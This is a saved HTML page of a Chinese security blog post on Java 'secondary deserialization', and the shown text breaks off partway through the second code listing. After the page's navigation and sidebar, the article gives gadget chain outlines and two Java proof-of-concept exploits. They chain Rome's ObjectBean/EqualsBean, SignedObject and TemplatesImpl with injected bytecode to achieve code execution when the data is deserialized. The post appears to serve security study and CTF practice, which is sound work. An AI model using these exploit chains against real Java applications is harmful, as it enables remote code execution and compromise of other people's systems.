@@ -1,0 +1,770 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    JAVA反序列化-二次反序列化 |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="[TOC] Java二次反序列化漏洞  SignedObject#getObject 看fastjson原生反序列化那章  Rome(ObjectBean#hashcode) 1Hashtable#readObject() -&gt; ObjectBean#hashcode() -&gt; EqualsBean#beanHashCode() -&gt; ToStringBean#toString(">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JAVA反序列化-二次反序列化">
+<meta property="og:url" content="http://example.com/2025/10/29/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="[TOC] Java二次反序列化漏洞  SignedObject#getObject 看fastjson原生反序列化那章  Rome(ObjectBean#hashcode) 1Hashtable#readObject() -&gt; ObjectBean#hashcode() -&gt; EqualsBean#beanHashCode() -&gt; ToStringBean#toString(">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/10/29/images/4-17617048414444.png">
+<meta property="og:image" content="http://example.com/2025/10/29/images/5-17617048465437.png">
+<meta property="og:image" content="http://example.com/2025/10/29/images/6-176170555916810.png">
+<meta property="og:image" content="http://example.com/2025/10/29/images/7-176170558142013.png">
+<meta property="og:image" content="http://example.com/2025/10/29/images/2746479-20240406181431300-1798807052.png#height=192&amp;id=rk6c6&amp;originHeight=457&amp;originWidth=1317&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=&amp;width=554.png">
+<meta property="og:image" content="http://example.com/2025/10/29/images/2746479-20240406181622349-1704377925.png#height=123&amp;id=n8OmI&amp;originHeight=305&amp;originWidth=1383&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=&amp;width=558.png">
+<meta property="og:image" content="http://example.com/2025/10/29/images/2746479-20240406181703994-980459123.png#height=190&amp;id=zGKXw&amp;originHeight=540&amp;originWidth=1588&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=&amp;width=557.png">
+<meta property="og:image" content="http://example.com/2025/10/29/images/2746479-20240406182152477-27918315.png#height=161&amp;id=hgun3&amp;originHeight=375&amp;originWidth=1298&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=&amp;width=555.png">
+<meta property="og:image" content="http://example.com/2025/10/29/images/2746479-20240406182259304-147015649.png#height=194&amp;id=NuUiQ&amp;originHeight=535&amp;originWidth=1533&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=&amp;width=555.png">
+<meta property="article:published_time" content="2025-10-29T02:14:20.000Z">
+<meta property="article:modified_time" content="2026-01-21T11:03:55.688Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="JAVA安全">
+<meta property="article:tag" content="JAVA反序列化">
+<meta property="article:tag" content="JAVA二次反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/10/29/images/4-17617048414444.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="JAVA反序列化-二次反序列化">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">JAVA反序列化-二次反序列化</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#signedobjectgetobject"><span class="toc-number">1.</span> <span class="toc-text"> SignedObject#getObject</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#romeobjectbeanhashcode"><span class="toc-number">1.1.</span> <span class="toc-text"> Rome(ObjectBean#hashcode)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#romeequalsbeanequals"><span class="toc-number">1.2.</span> <span class="toc-text"> Rome(EqualsBean#equals)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0cc%E4%BE%9D%E8%B5%96%E7%9A%84cb"><span class="toc-number">1.3.</span> <span class="toc-text"> 无CC依赖的CB</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rmiconnector"><span class="toc-number">2.</span> <span class="toc-text"> RMIConnector</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#poc"><span class="toc-number">2.1.</span> <span class="toc-text"> POC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wrapperconnectionpooldatasource"><span class="toc-number">3.</span> <span class="toc-text"> WrapperConnectionPoolDataSource</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cc6poc"><span class="toc-number">3.1.</span> <span class="toc-text"> CC6Poc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cbpoc"><span class="toc-number">3.2.</span> <span class="toc-text"> CBPoc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjsonpoc"><span class="toc-number">3.3.</span> <span class="toc-text"> fastjsonPoc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rmi%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BE%8B%E9%A2%98"><span class="toc-number">4.</span> <span class="toc-text"> RMI二次反序列化例题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sictf-cc_deserialize"><span class="toc-number">4.1.</span> <span class="toc-text"> sictf cc_deserialize</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jtatransactionmanager-spring%E9%93%BE%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90"><span class="toc-number">5.</span> <span class="toc-text"> JtaTransactionManager Spring链二次反序列化分析</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-JAVA反序列化-二次反序列化" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/10/29/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-10-29T02:14:20.000Z" itemprop="datePublished">2025-10-29</time>
+    <time style="display: none;" id="post-update-time">2026-01-21</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9/" data-aos="zoom-in">知识点</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <p>[TOC]</p>
+<p><a target="_blank" rel="noopener" href="https://baozongwi.xyz/p/java-secondary-deserialization/#romeobjectbeanhashcode">Java二次反序列化漏洞</a></p>
+<h2 id="signedobjectgetobject"><a class="markdownIt-Anchor" href="#signedobjectgetobject"></a> SignedObject#getObject</h2>
+<p>看fastjson原生反序列化那章</p>
+<h3 id="romeobjectbeanhashcode"><a class="markdownIt-Anchor" href="#romeobjectbeanhashcode"></a> Rome(ObjectBean#hashcode)</h3>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hashtable#readObject() -&gt; ObjectBean#hashcode() -&gt; EqualsBean#beanHashCode() -&gt; ToStringBean#toString()-&gt;SignedObject#getObject()</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.Exp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPair;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPairGenerator;</span><br><span class="line"><span class="keyword">import</span> java.security.Signature;</span><br><span class="line"><span class="keyword">import</span> java.security.SignedObject;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">hashCodePoc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">harmlessTemplates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(harmlessTemplates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Pwnr&quot;</span>);</span><br><span class="line">        setFieldValue(harmlessTemplates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,harmlessTemplates);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        Hashtable innerTable= <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        innerTable.put(equalsBean,<span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(harmlessTemplates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;ClassPool.getDefault().get(org.example.Base.Eval.class.getName()).toBytecode()&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(innerTable, kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">outerTable</span> <span class="operator">=</span> getpayload(SignedObject.class, signedObject);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] data=serialize(outerTable);</span><br><span class="line">        unserialize(data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object obj) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        <span class="keyword">return</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Hashtable <span class="title function_">getpayload</span><span class="params">(Class clazz, Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ObjectBean.class, <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(String.class, <span class="string">&quot;rand&quot;</span>));</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(objectBean, <span class="string">&quot;rand&quot;</span>);</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">expObjectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(clazz, obj);</span><br><span class="line">        setFieldValue(objectBean, <span class="string">&quot;_equalsBean&quot;</span>, <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ObjectBean.class, expObjectBean));</span><br><span class="line">        <span class="keyword">return</span> hashtable;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="romeequalsbeanequals"><a class="markdownIt-Anchor" href="#romeequalsbeanequals"></a> Rome(EqualsBean#equals)</h3>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hashtable#readObject() -&gt; EqualsBean#equals() -&gt; EqualsBean.beanEquals() -&gt; SignedObject#getObject()</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.Exp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">equalsBeanPoc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;ClassPool.getDefault().get(org.example.Base.Eval.class.getName()).toBytecode()&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">innerTable</span> <span class="operator">=</span> getPayload(Templates.class, obj);</span><br><span class="line"></span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(innerTable, kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">outerTable</span> <span class="operator">=</span> getPayload(SignedObject.class, signedObject);</span><br><span class="line">        <span class="type">byte</span>[] data=serialize(outerTable);</span><br><span class="line">        unserialize(data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Hashtable <span class="title function_">getPayload</span> <span class="params">(Class clazz, Object payloadObj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(String.class, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        